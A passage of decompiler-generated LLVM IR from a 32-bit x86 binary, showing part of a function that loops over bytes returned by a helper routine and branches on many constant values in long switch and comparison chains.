  br i1 %v15_804ddeb, label %dec_label_pc_804ed22, label %dec_label_pc_804ddf5

dec_label_pc_804ddf5:                             ; preds = %.loopexit
  %v1_804ddf5 = add i32 %v0_804ddeb, 1916
  %v2_804ddf5 = inttoptr i32 %v1_804ddf5 to i32*
  store i32 0, i32* %v2_804ddf5, align 4
  %v0_804de00.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804de00

dec_label_pc_804de00:                             ; preds = %dec_label_pc_804ec33, %dec_label_pc_804ddf5
  %v0_804de00 = phi i32 [ %v1_804ed10, %dec_label_pc_804ec33 ], [ %v0_804de00.pre, %dec_label_pc_804ddf5 ]
  %v1_804de00 = add i32 %v0_804de00, 1876
  %v2_804de00 = inttoptr i32 %v1_804de00 to i32*
  store i32 0, i32* %v2_804de00, align 4
  %v0_804de0b = load i32, i32* @esp, align 4
  %v1_804de0b = add i32 %v0_804de0b, 1880
  %v2_804de0b = inttoptr i32 %v1_804de0b to i32*
  store i32 0, i32* %v2_804de0b, align 4
  %v0_804de16 = load i32, i32* @esp, align 4
  %v1_804de16 = add i32 %v0_804de16, 1884
  %v2_804de16 = inttoptr i32 %v1_804de16 to i32*
  store i32 0, i32* %v2_804de16, align 4
  %v0_804de21 = load i32, i32* @esp, align 4
  %v1_804de21 = add i32 %v0_804de21, 1888
  %v2_804de21 = inttoptr i32 %v1_804de21 to i32*
  store i32 0, i32* %v2_804de21, align 4
  %v0_804de2c = call i32 @function_804d610()
  %v1_804de2c = trunc i32 %v0_804de2c to i16
  store i16 %v1_804de2c, i16* bitcast (i32* @global_var_8055104.10 to i16*), align 4
  %v0_804de37 = load i32, i32* @global_var_805515c.11, align 4
  store i32 %v0_804de37, i32* %eax.global-to-local, align 4
  store i32 %v0_804de37, i32* @global_var_805510c.12, align 4
  br label %dec_label_pc_804de41

dec_label_pc_804de41:                             ; preds = %dec_label_pc_804ebe7, %dec_label_pc_804fd8c, %dec_label_pc_804e5e6, %dec_label_pc_804e2bc, %dec_label_pc_804e233, %switch.early.test, %switch.early.test, %switch.early.test, %dec_label_pc_804df90, %dec_label_pc_804eb29, %dec_label_pc_804eb29, %dec_label_pc_804eb29, %dec_label_pc_804eb29, %dec_label_pc_804eb29, %dec_label_pc_804eb29, %dec_label_pc_804eb29, %dec_label_pc_804eb29, %dec_label_pc_804eb29, %dec_label_pc_804eb29, %dec_label_pc_804eb29, %dec_label_pc_804fe9a, %dec_label_pc_804fcf1, %dec_label_pc_804ea17, %dec_label_pc_804ea00, %dec_label_pc_804e9e7, %dec_label_pc_804e9f7, %dec_label_pc_804e9d0, %dec_label_pc_804e99b, %dec_label_pc_804e9a4, %dec_label_pc_80502f1, %dec_label_pc_804e98b, %dec_label_pc_804e79f, %dec_label_pc_804e78f, %dec_label_pc_804e779, %dec_label_pc_804e761, %dec_label_pc_804e749, %dec_label_pc_804e739, %dec_label_pc_804e729, %dec_label_pc_804e6eb, %dec_label_pc_804e828, %dec_label_pc_804e831, %dec_label_pc_804e7cd, %dec_label_pc_8050147, %dec_label_pc_8050130, %dec_label_pc_804e848, %dec_label_pc_80500f9, %dec_label_pc_804e6db, %dec_label_pc_804e6d2, %dec_label_pc_80500b6, %dec_label_pc_80500a0, %dec_label_pc_804e6a2, %dec_label_pc_805006b, %dec_label_pc_804e65e, %dec_label_pc_804e667, %dec_label_pc_804e64e, %dec_label_pc_804e60a, %dec_label_pc_804ffec, %dec_label_pc_804ffa3, %dec_label_pc_804ff8c, %dec_label_pc_804ff57, %dec_label_pc_804e27a, %dec_label_pc_804fec7, %dec_label_pc_804feb0, %dec_label_pc_804fe84, %dec_label_pc_804fe6d, %dec_label_pc_804ea7c, %dec_label_pc_804ea85, %dec_label_pc_804ea27, %dec_label_pc_804ea53, %dec_label_pc_804ea5c, %dec_label_pc_804fdda, %dec_label_pc_804ea9c, %dec_label_pc_804fda3, %dec_label_pc_804fd6d, %dec_label_pc_804eb72, %dec_label_pc_804fd36, %dec_label_pc_804fd1f, %dec_label_pc_804fd08, %dec_label_pc_804fcda, %dec_label_pc_804fcb5, %dec_label_pc_804ec21, %dec_label_pc_804ebab, %dec_label_pc_804eb16, %dec_label_pc_804eaea, %dec_label_pc_804eab5, %dec_label_pc_804ea3e, %dec_label_pc_804e9bb, %dec_label_pc_804e892, %dec_label_pc_804e808, %dec_label_pc_804e7f3, %dec_label_pc_804e7e1, %dec_label_pc_804e70a, %dec_label_pc_804e67e, %dec_label_pc_804e629, %dec_label_pc_804e5a2, %dec_label_pc_804e5a2, %dec_label_pc_804e530, %dec_label_pc_804e530, %dec_label_pc_804e4f4, %dec_label_pc_804e4cf, %dec_label_pc_804e4b2, %dec_label_pc_804e48d, %dec_label_pc_804e478, %dec_label_pc_804e444, %dec_label_pc_804e426, %dec_label_pc_804e40e, %dec_label_pc_804e3e2, %dec_label_pc_804e3b2, %dec_label_pc_804e394, %dec_label_pc_804e37f, %dec_label_pc_804e36a, %dec_label_pc_804e35c, %dec_label_pc_804e34e, %dec_label_pc_804e33e, %dec_label_pc_804e30a, %dec_label_pc_804e2ae, %dec_label_pc_804e225, %dec_label_pc_804e118, %dec_label_pc_804e0a1, %dec_label_pc_804dfcd, %dec_label_pc_804df68, %dec_label_pc_804df68, %dec_label_pc_804df68, %dec_label_pc_804df30, %dec_label_pc_804deca, %dec_label_pc_804de5f, %dec_label_pc_804de5f, %dec_label_pc_804de5f, %dec_label_pc_804de5f, %dec_label_pc_804de5f, %dec_label_pc_804de5f, %dec_label_pc_804de5f, %dec_label_pc_804de5f, %dec_label_pc_804de5f, %dec_label_pc_804de5f, %dec_label_pc_804de5f, %dec_label_pc_804de5f, %dec_label_pc_804de5f, %dec_label_pc_804de5f, %dec_label_pc_804de5f, %dec_label_pc_804de5f, %dec_label_pc_804de5f, %dec_label_pc_804de5f, %dec_label_pc_804de5f, %dec_label_pc_804de5f, %dec_label_pc_804de5f, %dec_label_pc_804de41, %dec_label_pc_804de41, %dec_label_pc_805033f, %dec_label_pc_80502e3, %dec_label_pc_80502d5, %dec_label_pc_80502bc, %dec_label_pc_80502a3, %dec_label_pc_8050295, %dec_label_pc_8050266, %dec_label_pc_804ff6e, %dec_label_pc_804ff3e, %dec_label_pc_804fca7, %dec_label_pc_804fc99, %dec_label_pc_805015e, %dec_label_pc_8050003, %dec_label_pc_804ffde, %dec_label_pc_804ffc5, %dec_label_pc_804ff7c, %dec_label_pc_804ff2e, %dec_label_pc_804ff1e, %dec_label_pc_804ff02, %dec_label_pc_804fee9, %dec_label_pc_804fccc, %dec_label_pc_804ec16, %dec_label_pc_804ebde, %dec_label_pc_804eb69, %dec_label_pc_804eb4c, %dec_label_pc_804eb09, %dec_label_pc_804eadd, %dec_label_pc_804e973, %dec_label_pc_804e95f, %dec_label_pc_804e94a, %dec_label_pc_804e923, %dec_label_pc_804e90d, %dec_label_pc_804e8f7, %dec_label_pc_804e8de, %dec_label_pc_804e8ce, %dec_label_pc_804e8be, %dec_label_pc_804e8ae, %dec_label_pc_804e5dd, %dec_label_pc_804e5cb, %dec_label_pc_804e590, %dec_label_pc_804e56e, %dec_label_pc_804e556, %dec_label_pc_804e546, %dec_label_pc_804e518, %dec_label_pc_804e460, %dec_label_pc_804e401, %dec_label_pc_804e326, %dec_label_pc_804e20b, %dec_label_pc_804e1da, %dec_label_pc_804e1b3, %dec_label_pc_804e19b, %dec_label_pc_804e183, %dec_label_pc_804e173, %dec_label_pc_804e159, %dec_label_pc_804e142, %dec_label_pc_804e0ed, %dec_label_pc_804e0e2, %dec_label_pc_804e0cb, %dec_label_pc_804e08f, %dec_label_pc_804e075, %dec_label_pc_804e064, %dec_label_pc_804e04a, %dec_label_pc_804e021, %dec_label_pc_804e016, %dec_label_pc_804dff4, %dec_label_pc_804dfc2, %dec_label_pc_804df25, %dec_label_pc_804df0b, %dec_label_pc_804def1, %dec_label_pc_804dec1, %dec_label_pc_804e5ff, %dec_label_pc_804e7c0, %dec_label_pc_804de00
  %v0_804de41 = call i32 @function_804d610()
  store i32 %v0_804de41, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v0_804de41, 65536
  %v1_804de46 = sdiv i32 %sext, 65536
  %v2_804de4c = urem i32 %v0_804de41, 256
  %v3_804de4c = load i32, i32* @ecx, align 4
  %v4_804de4c = and i32 %v3_804de4c, -256
  %v5_804de4c = or i32 %v4_804de4c, %v2_804de4c
  store i32 %v5_804de4c, i32* %ecx.global-to-local, align 4
  %v2_804de4e = udiv i32 %v1_804de46, 256
  store i32 %v2_804de4e, i32* @ebx, align 4
  %v2_804de51 = udiv i32 %v1_804de46, 65536
  %v4_804de51 = trunc i32 %v2_804de51 to i8
  store i32 %v2_804de51, i32* %edx.global-to-local, align 4
  %v2_804de54 = udiv i32 %v1_804de46, 16777216
  store i32 %v2_804de54, i32* @edi, align 4
  %v2_804de57 = trunc i32 %v0_804de41 to i8
  switch i8 %v2_804de57, label %dec_label_pc_804de5f [
    i8 127, label %dec_label_pc_804de41
    i8 0, label %dec_label_pc_804de41
  ]

dec_label_pc_804de5f:                             ; preds = %dec_label_pc_804de41
  switch i8 %v2_804de57, label %dec_label_pc_804deb3 [
    i8 3, label %dec_label_pc_804de41
    i8 15, label %dec_label_pc_804de41
    i8 56, label %dec_label_pc_804de41
    i8 10, label %dec_label_pc_804de41
    i8 25, label %dec_label_pc_804de41
    i8 49, label %dec_label_pc_804de41
    i8 50, label %dec_label_pc_804de41
    i8 -119, label %dec_label_pc_804de41
    i8 6, label %dec_label_pc_804de41
    i8 7, label %dec_label_pc_804de41
    i8 11, label %dec_label_pc_804de41
    i8 21, label %dec_label_pc_804de41
    i8 22, label %dec_label_pc_804de41
    i8 26, label %dec_label_pc_804de41
    i8 28, label %dec_label_pc_804de41
    i8 29, label %dec_label_pc_804de41
    i8 30, label %dec_label_pc_804de41
    i8 33, label %dec_label_pc_804de41
    i8 55, label %dec_label_pc_804de41
    i8 -42, label %dec_label_pc_804de41
    i8 -41, label %dec_label_pc_804de41
  ]

dec_label_pc_804deb3:                             ; preds = %dec_label_pc_804de5f
  %v9_804deb3 = icmp eq i8 %v2_804de57, -64
  %v1_804deb5 = zext i1 %v9_804deb3 to i8
  %v2_804deb5 = load i32, i32* @esp, align 4
  %v3_804deb5 = add i32 %v2_804deb5, 87
  %v4_804deb5 = inttoptr i32 %v3_804deb5 to i8*
  store i8 %v1_804deb5, i8* %v4_804deb5, align 1
  %v0_804deba = load i32, i32* @esp, align 4
  %v1_804deba = add i32 %v0_804deba, 87
  %v2_804deba = inttoptr i32 %v1_804deba to i8*
  %v3_804deba = load i8, i8* %v2_804deba, align 1
  %v4_804deba = icmp eq i8 %v3_804deba, 0
  br i1 %v4_804deba, label %dec_label_pc_804deca, label %dec_label_pc_804dec1

dec_label_pc_804dec1:                             ; preds = %dec_label_pc_804deb3
  %v0_804dec1 = load i32, i32* @ebx, align 4
  %v1_804dec1 = trunc i32 %v0_804dec1 to i8
  %v11_804dec1 = icmp eq i8 %v1_804dec1, -88
  br i1 %v11_804dec1, label %dec_label_pc_804de41, label %dec_label_pc_804deca

dec_label_pc_804deca:                             ; preds = %dec_label_pc_804dec1, %dec_label_pc_804deb3
  %v0_804deca = load i32, i32* %ecx.global-to-local, align 4
  %v1_804deca = trunc i32 %v0_804deca to i8
  %v11_804deca = icmp eq i8 %v1_804deca, -110
  %v1_804decd = zext i1 %v11_804deca to i8
  %v3_804decd = add i32 %v0_804deba, 86
  %v4_804decd = inttoptr i32 %v3_804decd to i8*
  store i8 %v1_804decd, i8* %v4_804decd, align 1
  %v0_804ded2 = load i32, i32* @esp, align 4
  %v1_804ded2 = add i32 %v0_804ded2, 86
  %v2_804ded2 = inttoptr i32 %v1_804ded2 to i8*
  %v3_804ded2 = load i8, i8* %v2_804ded2, align 1
  %v4_804ded2 = icmp ne i8 %v3_804ded2, 0
  %v0_804dee2.pre = load i32, i32* @ebx, align 4
  %v1_804ded9 = trunc i32 %v0_804dee2.pre to i8
  %v10_804ded9 = icmp eq i8 %v1_804ded9, 17
  %or.cond = and i1 %v4_804ded2, %v10_804ded9
  br i1 %or.cond, label %dec_label_pc_804de41, label %dec_label_pc_804dee2

dec_label_pc_804dee2:                             ; preds = %dec_label_pc_804deca
  %v7_804dee2 = icmp eq i8 %v1_804ded9, 80
  %v1_804dee5 = zext i1 %v7_804dee2 to i8
  %v3_804dee5 = add i32 %v0_804ded2, 85
  %v4_804dee5 = inttoptr i32 %v3_804dee5 to i8*
  store i8 %v1_804dee5, i8* %v4_804dee5, align 1
  %v0_804deea = load i32, i32* @esp, align 4
  %v1_804deea = add i32 %v0_804deea, 86
  %v2_804deea = inttoptr i32 %v1_804deea to i8*
  %v3_804deea = load i8, i8* %v2_804deea, align 1
  %v4_804deea = icmp eq i8 %v3_804deea, 0
  br i1 %v4_804deea, label %dec_label_pc_804defc, label %dec_label_pc_804def1

dec_label_pc_804def1:                             ; preds = %dec_label_pc_804dee2
  %v1_804def1 = add i32 %v0_804deea, 85
  %v2_804def1 = inttoptr i32 %v1_804def1 to i8*
  %v3_804def1 = load i8, i8* %v2_804def1, align 1
  %v4_804def1 = icmp eq i8 %v3_804def1, 0
  %v1_804def6 = icmp eq i1 %v4_804def1, false
  br i1 %v1_804def6, label %dec_label_pc_804de41, label %dec_label_pc_804defc

dec_label_pc_804defc:                             ; preds = %dec_label_pc_804def1, %dec_label_pc_804dee2
  %v0_804defc = load i32, i32* @ebx, align 4
  %v1_804defc = trunc i32 %v0_804defc to i8
  %v10_804defc = icmp eq i8 %v1_804defc, 98
  %v1_804deff = zext i1 %v10_804defc to i8
  %v3_804deff = add i32 %v0_804deea, 84
  %v4_804deff = inttoptr i32 %v3_804deff to i8*
  store i8 %v1_804deff, i8* %v4_804deff, align 1
  %v0_804df04 = load i32, i32* @esp, align 4
  %v1_804df04 = add i32 %v0_804df04, 86
  %v2_804df04 = inttoptr i32 %v1_804df04 to i8*
  %v3_804df04 = load i8, i8* %v2_804df04, align 1
  %v4_804df04 = icmp eq i8 %v3_804df04, 0
  br i1 %v4_804df04, label %dec_label_pc_804df16, label %dec_label_pc_804df0b

dec_label_pc_804df0b:                             ; preds = %dec_label_pc_804defc
  %v1_804df0b = add i32 %v0_804df04, 84
  %v2_804df0b = inttoptr i32 %v1_804df0b to i8*
  %v3_804df0b = load i8, i8* %v2_804df0b, align 1
  %v4_804df0b = icmp eq i8 %v3_804df0b, 0
  %v1_804df10 = icmp eq i1 %v4_804df0b, false
  br i1 %v1_804df10, label %dec_label_pc_804de41, label %dec_label_pc_804df16

dec_label_pc_804df16:                             ; preds = %dec_label_pc_804df0b, %dec_label_pc_804defc
  %v0_804df16 = load i32, i32* @ebx, align 4
  %v1_804df16 = trunc i32 %v0_804df16 to i8
  %v11_804df16 = icmp eq i8 %v1_804df16, -102
  %v1_804df19 = zext i1 %v11_804df16 to i8
  %v3_804df19 = add i32 %v0_804df04, 83
  %v4_804df19 = inttoptr i32 %v3_804df19 to i8*
  store i8 %v1_804df19, i8* %v4_804df19, align 1
  %v0_804df1e = load i32, i32* @esp, align 4
  %v1_804df1e = add i32 %v0_804df1e, 86
  %v2_804df1e = inttoptr i32 %v1_804df1e to i8*
  %v3_804df1e = load i8, i8* %v2_804df1e, align 1
  %v4_804df1e = icmp eq i8 %v3_804df1e, 0
  br i1 %v4_804df1e, label %dec_label_pc_804df30, label %dec_label_pc_804df25

dec_label_pc_804df25:                             ; preds = %dec_label_pc_804df16
  %v1_804df25 = add i32 %v0_804df1e, 83
  %v2_804df25 = inttoptr i32 %v1_804df25 to i8*
  %v3_804df25 = load i8, i8* %v2_804df25, align 1
  %v4_804df25 = icmp eq i8 %v3_804df25, 0
  %v1_804df2a = icmp eq i1 %v4_804df25, false
  br i1 %v1_804df2a, label %dec_label_pc_804de41, label %dec_label_pc_804df30

dec_label_pc_804df30:                             ; preds = %dec_label_pc_804df25, %dec_label_pc_804df16
  %v0_804df30 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804df30 = trunc i32 %v0_804df30 to i8
  %v11_804df30 = icmp eq i8 %v1_804df30, -109
  %v1_804df33 = zext i1 %v11_804df30 to i8
  %v3_804df33 = add i32 %v0_804df1e, 82
  %v4_804df33 = inttoptr i32 %v3_804df33 to i8*
  store i8 %v1_804df33, i8* %v4_804df33, align 1
  %v0_804df38 = load i32, i32* @esp, align 4
  %v1_804df38 = add i32 %v0_804df38, 82
  %v2_804df38 = inttoptr i32 %v1_804df38 to i8*
  %v3_804df38 = load i8, i8* %v2_804df38, align 1
  %v4_804df38 = icmp ne i8 %v3_804df38, 0
  %v0_804df48.pre = load i32, i32* @ebx, align 4
  %v1_804df3f = trunc i32 %v0_804df48.pre to i8
  %v11_804df3f = icmp eq i8 %v1_804df3f, -97
  %or.cond195 = and i1 %v4_804df38, %v11_804df3f
  br i1 %or.cond195, label %dec_label_pc_804de41, label %dec_label_pc_804df48

dec_label_pc_804df48:                             ; preds = %dec_label_pc_804df30
  %v10_804df48 = icmp eq i8 %v1_804df3f, 114
  %v1_804df4b = zext i1 %v10_804df48 to i8
  %v3_804df4b = add i32 %v0_804df38, 81
  %v4_804df4b = inttoptr i32 %v3_804df4b to i8*
  store i8 %v1_804df4b, i8* %v4_804df4b, align 1
  %v0_804df50 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804df50 = trunc i32 %v0_804df50 to i8
  %v11_804df50 = icmp eq i8 %v1_804df50, -108
  %v0_804ff7c = load i32, i32* @esp, align 4
  br i1 %v11_804df50, label %dec_label_pc_804ff7c, label %dec_label_pc_804df59

dec_label_pc_804df59:                             ; preds = %dec_label_pc_804df48, %dec_label_pc_804ff7c
  %v11_804df59 = icmp eq i8 %v1_804df50, -106
  %v1_804df5c = zext i1 %v11_804df59 to i8
  %v3_804df5c = add i32 %v0_804ff7c, 80
  %v4_804df5c = inttoptr i32 %v3_804df5c to i8*
  store i8 %v1_804df5c, i8* %v4_804df5c, align 1
  %v0_804df61 = load i32, i32* @esp, align 4
  %v1_804df61 = add i32 %v0_804df61, 80
  %v2_804df61 = inttoptr i32 %v1_804df61 to i8*
  %v3_804df61 = load i8, i8* %v2_804df61, align 1
  %v4_804df61 = icmp eq i8 %v3_804df61, 0
  %v0_804df83.pre = load i32, i32* @ebx, align 4
  %.pre = trunc i32 %v0_804df83.pre to i8
  br i1 %v4_804df61, label %dec_label_pc_804df83, label %dec_label_pc_804df68

dec_label_pc_804df68:                             ; preds = %dec_label_pc_804df59
  switch i8 %.pre, label %dec_label_pc_804df83 [
    i8 125, label %dec_label_pc_804de41
    i8 -123, label %dec_label_pc_804de41
    i8 -112, label %dec_label_pc_804de41
  ]

dec_label_pc_804df83:                             ; preds = %dec_label_pc_804df59, %dec_label_pc_804df68
  %v11_804df83 = icmp eq i8 %.pre, -107
  %v1_804df86 = zext i1 %v11_804df83 to i32
  %v4_804df86 = and i32 %v1_804de46, -256
  %v5_804df86 = or i32 %v1_804df86, %v4_804df86
  store i32 %v5_804df86, i32* %eax.global-to-local, align 4
  %v3_804df89 = load i8, i8* %v2_804df61, align 1
  %v4_804df89 = icmp eq i8 %v3_804df89, 0
  br i1 %v4_804df89, label %dec_label_pc_804dfb3, label %dec_label_pc_804df90

dec_label_pc_804df90:                             ; preds = %dec_label_pc_804df83
  %v4_804df90 = icmp eq i1 %v11_804df83, false
  %v1_804df92 = icmp eq i1 %v4_804df90, false
  br i1 %v1_804df92, label %dec_label_pc_804de41, label %switch.early.test

switch.early.test:                                ; preds = %dec_label_pc_804df90
  switch i8 %.pre, label %dec_label_pc_804dfb3 [
    i8 -66, label %dec_label_pc_804de41
    i8 -72, label %dec_label_pc_804de41
    i8 -99, label %dec_label_pc_804de41
  ]

dec_label_pc_804dfb3:                             ; preds = %switch.early.test, %dec_label_pc_804df83
  %v11_804dfb3 = icmp eq i8 %.pre, -60
  %v1_804dfb6 = zext i1 %v11_804dfb3 to i8
  %v3_804dfb6 = add i32 %v0_804df61, 79
  %v4_804dfb6 = inttoptr i32 %v3_804dfb6 to i8*
  store i8 %v1_804dfb6, i8* %v4_804dfb6, align 1
  %v0_804dfbb = load i32, i32* @esp, align 4
  %v1_804dfbb = add i32 %v0_804dfbb, 80
  %v2_804dfbb = inttoptr i32 %v1_804dfbb to i8*
  %v3_804dfbb = load i8, i8* %v2_804dfbb, align 1
  %v4_804dfbb = icmp eq i8 %v3_804dfbb, 0
  br i1 %v4_804dfbb, label %dec_label_pc_804dfcd, label %dec_label_pc_804dfc2

dec_label_pc_804dfc2:                             ; preds = %dec_label_pc_804dfb3
  %v1_804dfc2 = add i32 %v0_804dfbb, 79
  %v2_804dfc2 = inttoptr i32 %v1_804dfc2 to i8*
  %v3_804dfc2 = load i8, i8* %v2_804dfc2, align 1
  %v4_804dfc2 = icmp eq i8 %v3_804dfc2, 0
  %v1_804dfc7 = icmp eq i1 %v4_804dfc2, false
  br i1 %v1_804dfc7, label %dec_label_pc_804de41, label %dec_label_pc_804dfcd

dec_label_pc_804dfcd:                             ; preds = %dec_label_pc_804dfc2, %dec_label_pc_804dfb3
  %v0_804dfcd = load i32, i32* %ecx.global-to-local, align 4
  %v1_804dfcd = trunc i32 %v0_804dfcd to i8
  %v11_804dfcd = icmp eq i8 %v1_804dfcd, -104
  %v1_804dfd0 = zext i1 %v11_804dfcd to i8
  %v3_804dfd0 = add i32 %v0_804dfbb, 78
  %v4_804dfd0 = inttoptr i32 %v3_804dfd0 to i8*
  store i8 %v1_804dfd0, i8* %v4_804dfd0, align 1
  %v0_804dfd5 = load i32, i32* @esp, align 4
  %v1_804dfd5 = add i32 %v0_804dfd5, 78
  %v2_804dfd5 = inttoptr i32 %v1_804dfd5 to i8*
  %v3_804dfd5 = load i8, i8* %v2_804dfd5, align 1
  %v4_804dfd5 = icmp ne i8 %v3_804dfd5, 0
  %v0_804dfe5.pre = load i32, i32* @ebx, align 4
  %v1_804dfdc = trunc i32 %v0_804dfe5.pre to i8
  %v10_804dfdc = icmp eq i8 %v1_804dfdc, 82
  %or.cond199 = and i1 %v4_804dfd5, %v10_804dfdc
  br i1 %or.cond199, label %dec_label_pc_804de41, label %dec_label_pc_804dfe5

dec_label_pc_804dfe5:                             ; preds = %dec_label_pc_804dfcd
  %v11_804dfe5 = icmp eq i8 %v1_804dfdc, -27
  %v1_804dfe8 = zext i1 %v11_804dfe5 to i8
  %v3_804dfe8 = add i32 %v0_804dfd5, 77
  %v4_804dfe8 = inttoptr i32 %v3_804dfe8 to i8*
  store i8 %v1_804dfe8, i8* %v4_804dfe8, align 1
  %v0_804dfed = load i32, i32* @esp, align 4
  %v1_804dfed = add i32 %v0_804dfed, 78
  %v2_804dfed = inttoptr i32 %v1_804dfed to i8*
  %v3_804dfed = load i8, i8* %v2_804dfed, align 1
  %v4_804dfed = icmp eq i8 %v3_804dfed, 0
  br i1 %v4_804dfed, label %dec_label_pc_804dfff, label %dec_label_pc_804dff4

dec_label_pc_804dff4:                             ; preds = %dec_label_pc_804dfe5
  %v1_804dff4 = add i32 %v0_804dfed, 77
  %v2_804dff4 = inttoptr i32 %v1_804dff4 to i8*
  %v3_804dff4 = load i8, i8* %v2_804dff4, align 1
  %v4_804dff4 = icmp eq i8 %v3_804dff4, 0
  %v1_804dff9 = icmp eq i1 %v4_804dff4, false
  br i1 %v1_804dff9, label %dec_label_pc_804de41, label %dec_label_pc_804dfff

dec_label_pc_804dfff:                             ; preds = %dec_label_pc_804dff4, %dec_label_pc_804dfe5
  %v0_804dfff = load i32, i32* %ecx.global-to-local, align 4
  %v1_804dfff = trunc i32 %v0_804dfff to i8
  %v11_804dfff = icmp eq i8 %v1_804dfff, -99
  %v1_804e002 = zext i1 %v11_804dfff to i8
  %v3_804e002 = add i32 %v0_804dfed, 76
  %v4_804e002 = inttoptr i32 %v3_804e002 to i8*
  store i8 %v1_804e002, i8* %v4_804e002, align 1
  %v0_804e007 = load i32, i32* @ebx, align 4
  %v1_804e007 = trunc i32 %v0_804e007 to i8
  %v11_804e007 = icmp eq i8 %v1_804e007, -54
  %v1_804e00a = zext i1 %v11_804e007 to i8
  %v2_804e00a = load i32, i32* @esp, align 4
  %v3_804e00a = add i32 %v2_804e00a, 75
  %v4_804e00a = inttoptr i32 %v3_804e00a to i8*
  store i8 %v1_804e00a, i8* %v4_804e00a, align 1
  %v0_804e00f = load i32, i32* @esp, align 4
  %v1_804e00f = add i32 %v0_804e00f, 76
  %v2_804e00f = inttoptr i32 %v1_804e00f to i8*
  %v3_804e00f = load i8, i8* %v2_804e00f, align 1
  %v4_804e00f = icmp eq i8 %v3_804e00f, 0
  br i1 %v4_804e00f, label %dec_label_pc_804e02a, label %dec_label_pc_804e016

dec_label_pc_804e016:                             ; preds = %dec_label_pc_804dfff
  %v1_804e016 = add i32 %v0_804e00f, 75
  %v2_804e016 = inttoptr i32 %v1_804e016 to i8*
  %v3_804e016 = load i8, i8* %v2_804e016, align 1
  %v4_804e016 = icmp eq i8 %v3_804e016, 0
  %v1_804e01b = icmp eq i1 %v4_804e016, false
  br i1 %v1_804e01b, label %dec_label_pc_804de41, label %dec_label_pc_804e021

dec_label_pc_804e021:                             ; preds = %dec_label_pc_804e016
  %v0_804e021 = load i32, i32* @ebx, align 4
  %v1_804e021 = trunc i32 %v0_804e021 to i8
  %v11_804e021 = icmp eq i8 %v1_804e021, -39
  br i1 %v11_804e021, label %dec_label_pc_804de41, label %dec_label_pc_804e02a

dec_label_pc_804e02a:                             ; preds = %dec_label_pc_804e021, %dec_label_pc_804dfff
  %v0_804e02a = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e02a = trunc i32 %v0_804e02a to i8
  %v11_804e02a = icmp eq i8 %v1_804e02a, -95
  br i1 %v11_804e02a, label %dec_label_pc_804ff6e, label %dec_label_pc_804e033

dec_label_pc_804e033:                             ; preds = %dec_label_pc_804ff6e, %dec_label_pc_804e02a
  %v11_804e033 = icmp eq i8 %v1_804e02a, -94
  %v1_804e036 = zext i1 %v11_804e033 to i8
  %v3_804e036 = add i32 %v0_804e00f, 74
  %v4_804e036 = inttoptr i32 %v3_804e036 to i8*
  store i8 %v1_804e036, i8* %v4_804e036, align 1
  %v0_804e03b = load i32, i32* @ebx, align 4
  %v1_804e03b = trunc i32 %v0_804e03b to i8
  %v7_804e03b = icmp eq i8 %v1_804e03b, 32
  %v1_804e03e = zext i1 %v7_804e03b to i8
  %v2_804e03e = load i32, i32* @esp, align 4
  %v3_804e03e = add i32 %v2_804e03e, 73
  %v4_804e03e = inttoptr i32 %v3_804e03e to i8*
  store i8 %v1_804e03e, i8* %v4_804e03e, align 1
  %v0_804e043 = load i32, i32* @esp, align 4
  %v1_804e043 = add i32 %v0_804e043, 74
  %v2_804e043 = inttoptr i32 %v1_804e043 to i8*
  %v3_804e043 = load i8, i8* %v2_804e043, align 1
  %v4_804e043 = icmp eq i8 %v3_804e043, 0
  br i1 %v4_804e043, label %dec_label_pc_804e055, label %dec_label_pc_804e04a

dec_label_pc_804e04a:                             ; preds = %dec_label_pc_804e033
  %v1_804e04a = add i32 %v0_804e043, 73
  %v2_804e04a = inttoptr i32 %v1_804e04a to i8*
  %v3_804e04a = load i8, i8* %v2_804e04a, align 1
  %v4_804e04a = icmp eq i8 %v3_804e04a, 0
  %v1_804e04f = icmp eq i1 %v4_804e04a, false
  br i1 %v1_804e04f, label %dec_label_pc_804de41, label %dec_label_pc_804e055

dec_label_pc_804e055:                             ; preds = %dec_label_pc_804e04a, %dec_label_pc_804e033
  %v0_804e055 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e055 = trunc i32 %v0_804e055 to i8
  %v11_804e055 = icmp eq i8 %v1_804e055, -101
  %v1_804e058 = zext i1 %v11_804e055 to i8
  %v3_804e058 = add i32 %v0_804e043, 72
  %v4_804e058 = inttoptr i32 %v3_804e058 to i8*
  store i8 %v1_804e058, i8* %v4_804e058, align 1
  %v0_804e05d = load i32, i32* @esp, align 4
  %v1_804e05d = add i32 %v0_804e05d, 72
  %v2_804e05d = inttoptr i32 %v1_804e05d to i8*
  %v3_804e05d = load i8, i8* %v2_804e05d, align 1
  %v4_804e05d = icmp eq i8 %v3_804e05d, 0
  br i1 %v4_804e05d, label %dec_label_pc_804e06d, label %dec_label_pc_804e064

dec_label_pc_804e064:                             ; preds = %dec_label_pc_804e055
  %v0_804e064 = load i32, i32* @ebx, align 4
  %v1_804e064 = trunc i32 %v0_804e064 to i8
  %v7_804e064 = icmp eq i8 %v1_804e064, 96
  br i1 %v7_804e064, label %dec_label_pc_804de41, label %dec_label_pc_804e06d

dec_label_pc_804e06d:                             ; preds = %dec_label_pc_804e064, %dec_label_pc_804e055
  %v3_804ff4c = phi i8 [ 0, %dec_label_pc_804e055 ], [ %v3_804e05d, %dec_label_pc_804e064 ]
  %v0_804e06d = load i32, i32* %eax.global-to-local, align 4
  %v3_804e06d = trunc i32 %v0_804e06d to i8
  %v4_804e06d = icmp eq i8 %v3_804e06d, 0
  %v4_804ff4c = icmp eq i8 %v3_804ff4c, 0
  br i1 %v4_804e06d, label %dec_label_pc_804ff4c, label %dec_label_pc_804e075

dec_label_pc_804e075:                             ; preds = %dec_label_pc_804e06d
  %v1_804e07a = icmp eq i1 %v4_804ff4c, false
  br i1 %v1_804e07a, label %dec_label_pc_804de41, label %dec_label_pc_804e080

dec_label_pc_804e080:                             ; preds = %dec_label_pc_804ff57, %dec_label_pc_804ff4c, %dec_label_pc_804e075
  %v0_804e080 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e080 = trunc i32 %v0_804e080 to i8
  %v11_804e080 = icmp eq i8 %v1_804e080, -92
  %v1_804e083 = zext i1 %v11_804e080 to i8
  %v3_804e083 = add i32 %v0_804e05d, 71
